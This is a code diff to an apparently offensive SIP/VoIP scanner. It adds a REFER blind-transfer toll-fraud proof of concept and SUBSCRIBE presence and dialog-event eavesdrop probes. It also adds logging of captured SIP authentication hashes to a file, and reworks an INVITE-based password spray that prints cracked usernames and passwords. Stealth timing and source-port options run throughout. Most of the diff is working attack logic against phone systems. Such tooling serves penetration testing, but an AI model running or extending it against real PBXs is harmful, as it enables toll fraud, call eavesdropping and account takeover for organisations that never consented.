@@ -700,6 +700,13 @@ def parse_args() -> argparse.Namespace:
                    help="Use the AMI-discovered first extension as the from-number and try "
                         "a call to --call-to to show dialplan routing. "
                         "Requires --call-to for the actual destination number.")
+    c.add_argument("--check-refer", action="store_true",
+                   help="Run REFER blind-transfer toll-fraud PoC and SUBSCRIBE presence "
+                        "eavesdrop probe. Auto-enabled when REFER or SUBSCRIBE appear in "
+                        "the Allow header.")
+    c.add_argument("--refer-to",
+                   help="Destination number for REFER blind-transfer PoC "
+                        "(defaults to --call-to when set)")
 
     t = p.add_argument_group("Tuning")
     t.add_argument("--mode", choices=["fast", "standard", "stealth"],
@@ -1807,6 +1814,122 @@ def main() -> int:
                          "SRTP downgrade: PBX silently accepted cleartext media when SRTP was offered",
                          col)
 
+        # ══════════════════════════════════════════════════════════════════
+        _phase(f"PHASE 4b · REFER / SUBSCRIBE PROBES  [{h.ip}]", col)
+
+        # Auto-enable --check-refer when the Allow header advertises REFER or SUBSCRIBE
+        _allow_methods = (h.sip or {}).get("allow", []) if h.sip else []
+        _dangerous_in_allow = {"REFER", "SUBSCRIBE"} & {m.upper() for m in _allow_methods}
+        if not getattr(args, "check_refer", False) and _dangerous_in_allow:
+            _warn(
+                f"Allow header advertises {sorted(_dangerous_in_allow)} — "
+                "auto-enabling --check-refer probe",
+                col,
+            )
+            args.check_refer = True
+
+        if getattr(args, "check_refer", False):
+            from scanner import sip as sip_mod
+
+            # ── SUBSCRIBE presence/dialog-event eavesdrop probe ──────────
+            _sub_exts = (
+                [e["extension"] for e in hr["extensions"][:3]]
+                if hr["extensions"]
+                else ["1000"]
+            )
+            _info(
+                f"SUBSCRIBE presence probe on {len(_sub_exts)} extension(s): "
+                f"{_sub_exts}",
+                col,
+            )
+            _sub_results: list[dict] = []
+            for _sx in _sub_exts:
+                _jitter_sleep(args.jitter)
+                _sr = sip_mod.subscribe_probe(
+                    h.ip, _sx, "presence",
+                    port=sip_port, timeout=args.timeout,
+                    traffic_log=traffic_log,
+                )
+                _sub_code = _sr.status_code if _sr else None
+                _sub_results.append({"ext": _sx, "code": _sub_code})
+                if _sub_code == 200:
+                    _finding(
+                        "high",
+                        f"SUBSCRIBE presence 200 OK for ext {_sx} — "
+                        "presence harvesting and dialog-event eavesdrop possible",
+                        col,
+                    )
+                elif _sub_code == 403:
+                    _info(
+                        f"SUBSCRIBE ext {_sx}: 403 Forbidden — extension exists but protected",
+                        col,
+                    )
+                elif _sub_code == 404:
+                    _info(f"SUBSCRIBE ext {_sx}: 404 Not Found", col)
+                else:
+                    _info(f"SUBSCRIBE ext {_sx}: {_sub_code or 'timeout'}", col)
+
+            # Dialog-event eavesdrop variant
+            _jitter_sleep(args.jitter)
+            _de_sr = sip_mod.subscribe_probe(
+                h.ip, _sub_exts[0], "dialog",
+                port=sip_port, timeout=args.timeout,
+                traffic_log=traffic_log,
+            )
+            if _de_sr and _de_sr.status_code == 200:
+                _finding(
+                    "high",
+                    f"SUBSCRIBE dialog 200 OK for ext {_sub_exts[0]} — "
+                    "call-state eavesdrop via dialog-event package confirmed",
+                    col,
+                )
+
+            hr["subscribe_probes"] = _sub_results
+
+            # ── REFER blind-transfer toll-fraud PoC ───────────────────────
+            _refer_to = getattr(args, "refer_to", None) or args.call_to
+            if _refer_to:
+                _refer_from = args.call_from or (
+                    hr["extensions"][0]["extension"] if hr["extensions"] else "1000"
+                )
+                _info(
+                    f"REFER blind-transfer PoC: from={_refer_from} "
+                    f"refer-to={_refer_to}",
+                    col,
+                )
+                _jitter_sleep(args.jitter)
+                _refer_result = call.test_refer_blind_transfer(
+                    h.ip, _refer_from, _refer_to,
+                    port=sip_port,
+                    username=args.username if hasattr(args, "username") else None,
+                    password=args.password if hasattr(args, "password") else None,
+                    timeout=args.timeout,
+                    traffic_log=traffic_log,
+                    source_ip=args.source_ip,
+                    source_port_range=source_port_range,
+                )
+                hr["refer_probe"] = _refer_result
+                if _refer_result["is_vulnerable"]:
+                    _finding(
+                        "critical",
+                        f"REFER BLIND-TRANSFER ACCEPTED — {_refer_result['evidence']}",
+                        col,
+                    )
+                elif _refer_result["status_code"] == 403:
+                    _info(f"REFER: {_refer_result['evidence']}", col)
+                else:
+                    _info(f"REFER: {_refer_result['evidence']}", col)
+            else:
+                _info(
+                    "REFER PoC skipped — provide --refer-to <number> or --call-to to run it",
+                    col,
+                )
+        else:
+            _info(
+                "REFER/SUBSCRIBE probes skipped (use --check-refer or ensure "
+                "REFER/SUBSCRIBE appear in Allow header)",
+                col,
+            )
 
         # ══════════════════════════════════════════════════════════════════
         _phase(f"PHASE 5 · EXTENSION ENUMERATION  [{h.ip}]", col)
@@ -2004,6 +2127,7 @@ def main() -> int:
                     traffic_log=traffic_log,
                     source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
                     ami_cracked_passwords=ami_pwds,
+                    hash_log_path=os.path.join(report_dir, "sip_hashes.txt") if args.report_dir else None,
                 )
                 prog.close()
                 successes = [asdict(c) for c in hits_spray if c.success]
@@ -2047,31 +2171,28 @@ def main() -> int:
                             col,
                         )
                         _jitter_sleep(args.jitter)
-                        try:
-                            invite_hits = auth.spray(
-                                h.ip, invite_auth_exts, creds,
-                                port=sip_port, timeout=args.timeout,
-                                max_workers=min(args.workers, 10),
-                                max_failures_per_ext=args.max_failures_per_ext,
-                                traffic_log=traffic_log,
-                                source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
-                                method="INVITE",
-                            )
-                            invite_successes = [asdict(c) for c in invite_hits if c.success]
-                            if invite_successes:
-                                hr["credentials_found"].extend(invite_successes)
-                                for c in invite_successes:
-                                    _finding(
-                                        "critical",
-                                        f"INVITE spray cracked: ext {col.BOLD}{c['extension']}{col.RESET}  "
-                                        f"{c['username']} / {col.BOLD}{c['password']}{col.RESET}",
-                                        col,
-                                    )
-                            else:
-                                _info("INVITE-based auth spray: no additional credentials found.", col)
-                        except TypeError:
-                            # auth.spray() may not support method= in all builds
-                            _info("INVITE auth spray not supported in this build — skipping.", col)
+                        invite_hits = auth.spray(
+                            h.ip, invite_auth_exts, creds,
+                            port=sip_port, timeout=args.timeout,
+                            max_workers=min(args.workers, 10),
+                            max_failures_per_ext=args.max_failures_per_ext,
+                            traffic_log=traffic_log,
+                            source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
+                            method="INVITE",
+                            hash_log_path=os.path.join(report_dir, "sip_hashes.txt") if args.report_dir else None,
+                        )
+                        invite_successes = [asdict(c) for c in invite_hits if c.success]
+                        if invite_successes:
+                            hr["credentials_found"].extend(invite_successes)
+                            for c in invite_successes:
+                                _finding(
+                                    "critical",
+                                    f"INVITE spray cracked: ext {col.BOLD}{c['extension']}{col.RESET}  "
+                                    f"{c['username']} / {col.BOLD}{c['password']}{col.RESET}",
+                                    col,
+                                )
+                        else:
+                            _info("INVITE-based auth spray: no additional credentials found.", col)
             else:
                 _info("No auth-required extensions to spray.", col)
         elif args.spray:
